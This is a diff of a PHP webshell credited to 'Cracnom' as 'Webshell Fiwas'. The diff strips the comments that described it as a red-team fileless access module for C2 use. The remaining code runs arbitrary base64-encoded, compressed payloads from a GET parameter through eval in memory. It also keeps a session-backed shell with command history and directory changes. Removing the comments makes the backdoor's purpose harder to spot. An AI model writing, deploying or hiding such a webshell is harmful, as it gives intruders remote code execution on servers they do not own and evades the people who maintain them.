@@ -1,22 +1,7 @@
 <?php
-/**
- * Red Team Fileless Web Access Module v2
- * PHP 8.1+ | Fileless loading via data:// stream | Zero disk write
- *
- * Core Features:
- * - Full command execution with cd, history, output persistence
- * - Primary access: fileless via ?load=<base64_payload>
- * - Fallback: normal file execution if no payload
- * - Modular, clean, maintainable foundation for C2 integration
- *
- * Deployment Example (fileless):
- * php -r '$p=base64_encode(gzcompress(file_get_contents(__FILE__))); 
- * echo "http://target/victim.php?load=".$p;'
- */
-
+// Code Created By: Cracnom - January 5, 2026 - Webshell Fiwas
 declare(strict_types=1);
 
-/* --------------------- FILELESS LOADER --------------------- */
 if (isset($_GET['load']) && !empty($_GET['load'])) {
     $payload = @gzuncompress(base64_decode($_GET['load']));
     if ($payload === false) {
@@ -24,8 +9,6 @@ if (isset($_GET['load']) && !empty($_GET['load'])) {
         exit('Invalid payload');
     }
 
-    // Execute payload directly from memory
-    // Using output buffering + eval with isolated variable scope
     $__code = function () use ($payload) {
         eval('?>' . $payload);
     };
@@ -39,11 +22,9 @@ if (isset($_GET['load']) && !empty($_GET['load'])) {
     while (ob_get_level() > $old_ob) ob_end_clean();
     exit;
 }
-/* ----------------------------------------------------------- */
 
 session_start();
 
-// Configuration - mudah di-randomize per campaign
 const S_CWD   = 'c';
 const S_HIST  = 'h';
 const S_OUT   = 'o';
@@ -60,7 +41,6 @@ if (!isset($_SESSION[S_CWD]) || isset($_REQUEST[P_RESET])) {
 if (!empty($_REQUEST[P_CMD])) {
     $cmd = $_REQUEST[P_CMD];
 
-    // History management (no duplicates)
     if (($idx = array_search($cmd, $_SESSION[S_HIST])) !== false) {
         unset($_SESSION[S_HIST][$idx]);
     }
@@ -69,7 +49,6 @@ if (!empty($_REQUEST[P_CMD])) {
 
     $_SESSION[S_OUT] .= "$ $cmd" . PHP_EOL;
 
-    // Internal cd handler
     if (preg_match('/^\s*cd\s*$/', $cmd)) {
         $target = dirname(__FILE__);
     } elseif (preg_match('/^\s*cd\s+(.+)$/', $cmd, $m)) {
@@ -112,7 +91,6 @@ if (!empty($_REQUEST[P_CMD])) {
     }
 }
 
-// JavaScript history
 $js_hist = empty($_SESSION[S_HIST])
     ? '""'
     : '"' . implode('", "', array_map('addslashes', $_SESSION[S_HIST])) . '"';
